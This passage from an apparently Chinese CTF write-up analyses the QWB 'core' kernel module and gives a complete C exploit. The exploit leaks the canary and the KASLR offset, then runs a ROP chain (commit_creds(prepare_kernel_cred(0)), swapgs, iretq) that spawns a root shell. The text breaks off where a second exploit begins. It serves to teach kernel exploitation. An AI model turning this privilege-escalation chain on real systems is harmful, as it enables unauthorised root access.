class="hljs-literal">No</span><br></code></pre></td></tr></table></figure><p>拖进ida分析，</p><ul><li><p>先来看看init函数：在&#x2F;proc 文件系统中动态创建一个名为 core 的虚拟文件，我们对ioctl等驱动函数的访问就是通过这个文件来实现的。同时在core_fops里定义了三个回调函数：<strong>core_write</strong>，<strong>core_ioctl</strong>,<strong>core_release</strong>。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp">__<span class="hljs-function">int64 <span class="hljs-title">init_module</span>()</span><br>&#123;<br>  core_proc = proc_create(<span class="hljs-string">&quot;core&quot;</span>, <span class="hljs-number">438L</span>L, <span class="hljs-number">0L</span>L, &amp;core_fops);<br>  printk(&amp;unk_2DE);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>exit_core函数：移除&#x2F;proc&#x2F;core</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-function">__int64 <span class="hljs-title">exit_core</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br><br>  <span class="hljs-keyword">if</span> ( core_proc )<br>    <span class="hljs-function"><span class="hljs-keyword">return</span> <span class="hljs-title">remove_proc_entry</span><span class="hljs-params">(<span class="hljs-string">&quot;core&quot;</span>)</span></span>;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>core_release函数：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss">__int64 <span class="hljs-built_in">core_release</span>()<br>&#123;<br>  <span class="hljs-built_in">printk</span>(&amp;unk_204);<br>  return <span class="hljs-number">0</span>LL;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>core_ioctl函数：定义了三条命令，我们可以使用ioctl(fd, cmd, …)来执行不同的操作。可以看到，当cmd&#x3D;0x6677889C时，我们可以设置off这个全局变量的值。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">__int64 __fastcall core_ioctl(__int64 <span class="hljs-built_in">a1</span>, int <span class="hljs-built_in">a2</span>, __int64 <span class="hljs-built_in">a3</span>)<br>&#123;<br>  <span class="hljs-keyword">switch </span>( <span class="hljs-built_in">a2</span> )<br>  &#123;<br>    case <span class="hljs-number">0x6677889B</span>:<br>      core_read(<span class="hljs-built_in">a3</span>);<br>      <span class="hljs-keyword">break;</span><br><span class="hljs-keyword"></span>    case <span class="hljs-number">0x6677889C</span>:<br>      printk(&amp;unk_2CD);<br>      off = <span class="hljs-built_in">a3</span>;<br>      <span class="hljs-keyword">break;</span><br><span class="hljs-keyword"></span>    case <span class="hljs-number">0x6677889A</span>:<br>      printk(&amp;unk_<span class="hljs-symbol">2B</span>3);<br>      core_copy_func(<span class="hljs-built_in">a3</span>);<br>      <span class="hljs-keyword">break;</span><br><span class="hljs-keyword"></span>  &#125;<br>  return <span class="hljs-number">0</span>LL;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>core_read函数：存在canary，并且发现** copy_to_user(a1, &amp;v5[off], 64LL);**可以从v5[off]的位置拷贝64字节到用户空间上，之前提到off的值是可以被控制的，那么我们就可以轻松的泄露出canary的值。</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs sqf">unsigned <span class="hljs-variable">__int64</span> <span class="hljs-variable">__fastcall</span> core_read(<span class="hljs-variable">__int64</span> a1)<br>&#123;<br>  char *v2; <span class="hljs-comment">// rdi</span><br>  <span class="hljs-variable">__int64</span> i; <span class="hljs-comment">// rcx</span><br>  unsigned <span class="hljs-variable">__int64</span> result; <span class="hljs-comment">// rax</span><br>  char v5[<span class="hljs-number">64</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h] BYREF</span><br>  unsigned <span class="hljs-variable">__int64</span> v6; <span class="hljs-comment">// [rsp+40h] [rbp-10h]</span><br><br>  v6 = <span class="hljs-variable">__readgsqword</span>(<span class="hljs-number">0</span>x28u);<br>  printk(&amp;unk_25B);<br>  printk(&amp;unk_275);<br>  v2 = v5;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">16</span>LL; i; --i )<br>  &#123;<br>    *(<span class="hljs-variable">_DWORD</span> *)v2 = <span class="hljs-number">0</span>;<br>    v2 += <span class="hljs-number">4</span>;<br>  &#125;<br>  strcpy(v5, <span class="hljs-string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);<br>  result = copy_to_user(a1, &amp;v5[off], <span class="hljs-number">64</span>LL);<br>  <span class="hljs-keyword">if</span> ( !result )<br>    return <span class="hljs-variable">__readgsqword</span>(<span class="hljs-number">0</span>x28u) ^ v6;<br>  <span class="hljs-variable">__asm</span> &#123; swapgs &#125;<br>  return result;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>core_copy_func函数：注意到传入的a1是__int64型，但是下面使用qmemcpy时是unsigned型，意味着我们可以使用负数来溢出。那么接下来我们只需要控制全局变量<strong>name</strong>的值就可以控制程序执行流了。</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">__int64</span> <span class="hljs-variable">__fastcall</span> core_copy_func(<span class="hljs-variable">__int64</span> a1)<br>&#123;<br>  <span class="hljs-variable">__int64</span> result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-variable">_QWORD</span> v2[<span class="hljs-number">10</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h] BYREF</span><br><br>  v2[<span class="hljs-number">8</span>] = <span class="hljs-variable">__readgsqword</span>(<span class="hljs-number">0</span>x28u);<br>  printk(&amp;unk_215);<br>  <span class="hljs-keyword">if</span> ( a1 &gt; <span class="hljs-number">63</span> )<br>  &#123;<br>    printk(&amp;unk_2A1);<br>    return <span class="hljs-number">0</span>xFFFFFFFFLL;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    result = <span class="hljs-number">0</span>LL;<br>    qmemcpy(v2, &amp;<span class="hljs-built_in">name</span>, (unsigned <span class="hljs-variable">__int16</span>)a1);<br>  &#125;<br>  return result;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>core_write函数：前面提到这是FOP回调定义的函数，所以我们直接使用<strong>write</strong>这个函数，就能将数据传入name中。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss">__int64 __fastcall <span class="hljs-built_in">core_write</span>(__int64 a1, __int64 a2, unsigned __int64 a3)<br>&#123;<br>  <span class="hljs-built_in">printk</span>(&amp;unk_215);<br>  if ( a3 &lt;= <span class="hljs-number">0</span>x800 &amp;&amp; !copy_from_user(&amp;name, a2, a3) )<br>    return (unsigned int)a3;<br>  <span class="hljs-built_in">printk</span>(&amp;unk_230);<br>  return <span class="hljs-number">0</span>xFFFFFFF2LL;<br>&#125;<br></code></pre></td></tr></table></figure><p>至此，逆向的工作就差不多了，漏洞利用的流程也很简单：</p></li><li><p>1.设置off以泄露canary</p></li><li><p>2.将payload传入name</p></li><li><p>3.利用负数溢出打ROP</p></li></ul><p>但是，还有一个小问题没有解决：本题是开启了KASLR保护的，我们还需要泄露函数地址和基地址。<br>先介绍几个概念：</p><ul><li>raw_vmlinux_base：KASLR 加工前的内核加载基址</li><li>vmlinux_base：KASLR 加工后的内核加载基址</li></ul><p>我们需要得到一个KASLR对内核基址的偏移，这个偏移offset&#x3D;vmlinux_base - raw_vmlinux_base。</p><p>然后我们就可以通过这个offset得到其他函数和gadget的实际加载地址了。</p><p>raw_vmlinux_base的值可以通过<strong>checksec vmlinux</strong>得到：由于本题没开PIE，所以就是下面的0xffffffff81000000。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>       <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">Version:</span>    <span class="hljs-number">4.15</span><span class="hljs-number">.8</span><br><span class="hljs-attr">RELRO:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>      <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">unknown</span> <span class="hljs-bullet">-</span> <span class="hljs-string">GNU_STACK</span> <span class="hljs-string">missing</span><br><span class="hljs-attr">PIE:</span>        <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0xffffffff81000000)</span><br><span class="hljs-attr">Stack:</span>      <span class="hljs-string">Executable</span><br><span class="hljs-attr">RWX:</span>        <span class="hljs-string">Has</span> <span class="hljs-string">RWX</span> <span class="hljs-string">segments</span><br><span class="hljs-attr">Stripped:</span>   <span class="hljs-literal">No</span><br></code></pre></td></tr></table></figure><p>对于本题，由于内核符号表(&#x2F;tmp&#x2F;kallsyms)可读，所以我们选择泄露<strong>commit_creds</strong>和<strong>prepare_kernel_cred</strong>这两个函数。</p><p>这两个函数的偏移我们可以直接写python脚本来泄露：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&quot;./vmlinux&quot;</span>)<br>raw_vmlinux_base = <span class="hljs-number">0xffffffff81000000</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;commit_creds: &quot;</span> + <span class="hljs-built_in">hex</span>(elf.symbols[<span class="hljs-string">&#x27;commit_creds&#x27;</span>] - raw_vmlinux_base))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;prepare_kernel_cred: &quot;</span> + <span class="hljs-built_in">hex</span>(elf.symbols[<span class="hljs-string">&#x27;prepare_kernel_cred&#x27;</span>] - raw_vmlinux_base))<br></code></pre></td></tr></table></figure><p>这里有一个问题，题目直接给出的vmlinux是有问题的，不能用，要用解压core.cpio出来得到的那个vmlinux。<br>得到：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">commit_creds</span>: <span class="hljs-number">0</span>x9c8e0<br><span class="hljs-attribute">prepare_kernel_cred</span>: <span class="hljs-number">0</span>x9cce0<br></code></pre></td></tr></table></figure><p>gadget的寻找还是可以用ROPgadget或ropper，但有的时候单独只用一个可能会找不到某些gadget，但是另一个可以找到（真奇怪。</p><p>官方的exp，这是使用ROP的：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">spawn_shell</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">getuid</span>())<br>    &#123;<br>        <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]spawn shell error!&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-number">0</span>, prepare_kernel_cred = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> raw_vmlinux_base = <span class="hljs-number">0xffffffff81000000</span>; <br><span class="hljs-type">size_t</span> vmlinux_base = <span class="hljs-number">0</span>;<br><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">find_symbols</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123;<br>    FILE* kallsyms_fd = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span>(kallsyms_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]open kallsyms error!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125; <br><br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x30</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fgets</span>(buf, <span class="hljs-number">0x30</span>, kallsyms_fd))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(commit_creds &amp; prepare_kernel_cred) <br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)<br>        &#123;<br>             <span class="hljs-type">char</span> hex[<span class="hljs-number">20</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(hex, buf, <span class="hljs-number">16</span>);<br>            <span class="hljs-built_in">sscanf</span>(hex, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;commit_creds);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);<br>            vmlinux_base = commit_creds - <span class="hljs-number">0x9c8e0</span>; <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)<br>        &#123;<br>            <span class="hljs-type">char</span> hex[<span class="hljs-number">20</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(hex, buf, <span class="hljs-number">16</span>);<br>            <span class="hljs-built_in">sscanf</span>(hex, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);<br>            vmlinux_base = prepare_kernel_cred - <span class="hljs-number">0x9cce0</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Error!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">//保存用户态环境</span><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">save_status</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]status has been saved.&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">set_off</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">long</span> <span class="hljs-type">long</span> idx)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]set off to %ld\n&quot;</span>, idx);<br>    <span class="hljs-built_in">ioctl</span>(fd, <span class="hljs-number">0x6677889C</span>, idx);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">core_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *buf)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]read to buf.&quot;</span>);<br>    <span class="hljs-built_in">ioctl</span>(fd, <span class="hljs-number">0x6677889B</span>, buf); <br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">core_copy_func</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">long</span> <span class="hljs-type">long</span> size)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]copy from user with size: %ld\n&quot;</span>, size);<br>    <span class="hljs-built_in">ioctl</span>(fd, <span class="hljs-number">0x6677889A</span>, size);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">save_status</span>();<br>    <span class="hljs-type">int</span> fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/core&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]open /proc/core error!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">find_symbols</span>(); <br>    <span class="hljs-type">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;<br><br>    <span class="hljs-built_in">set_off</span>(fd, <span class="hljs-number">0x40</span>); <br><br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x40</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">core_read</span>(fd, buf); <br>    <span class="hljs-type">size_t</span> canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>]; <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]canary: %p\n&quot;</span>, canary);<br><br>    <span class="hljs-type">size_t</span> rop[<span class="hljs-number">0x1000</span>] = &#123;<span class="hljs-number">0</span>&#125;; <br><br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>    &#123;<br>        rop[i] = canary; <br>    &#125;<br><br>    rop[i++] = <span class="hljs-number">0xffffffff81000b2f</span> + offset; <span class="hljs-comment">// pop rdi; ret</span><br>    rop[i++] = <span class="hljs-number">0</span>;<br>    rop[i++] = prepare_kernel_cred;         <span class="hljs-comment">// prepare_kernel_cred(0)</span><br><br>    <br>    rop[i++] = <span class="hljs-number">0xffffffff810a0f49</span> + offset; <span class="hljs-comment">// pop rdx; ret</span><br>    rop[i++] = <span class="hljs-number">0xffffffff81021e53</span> + offset; <span class="hljs-comment">// pop rcx; ret</span><br>    rop[i++] = <span class="hljs-number">0xffffffff8101aa6a</span> + offset; <span class="hljs-comment">// mov rdi, rax; call rdx; </span><br>    rop[i++] = commit_creds;<br><br>    rop[i++] = <span class="hljs-number">0xffffffff81a012da</span> + offset; <span class="hljs-comment">// swapgs; popfq; ret</span><br>    rop[i++] = <span class="hljs-number">0</span>;<br><br>    rop[i++] = <span class="hljs-number">0xffffffff81050ac2</span> + offset; <span class="hljs-comment">// iretq; ret; </span><br><br>    rop[i++] = (<span class="hljs-type">size_t</span>)spawn_shell;  <br><br>    rop[i++] = user_cs;<br>    rop[i++] = user_rflags;<br>    rop[i++] = user_sp;<br>    rop[i++] = user_ss;<br><br>    <span class="hljs-built_in">write</span>(fd, rop, <span class="hljs-number">0x800</span>); <br>    <span class="hljs-built_in">core_copy_func</span>(fd, <span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>)); <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>接下来把这个.c文件gcc后重新打包，启动kernel后执行这个文件，就可以提权了。</p><p>还有一种使用ret2user的方式，比起ROP更简单，但是只能在未开启 SMAP&#x2F;SMEP 保护时使用，大体流程和上面差不多，只是在构造ROP时有一点点区别，这里就不再赘述了，给出exp：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span 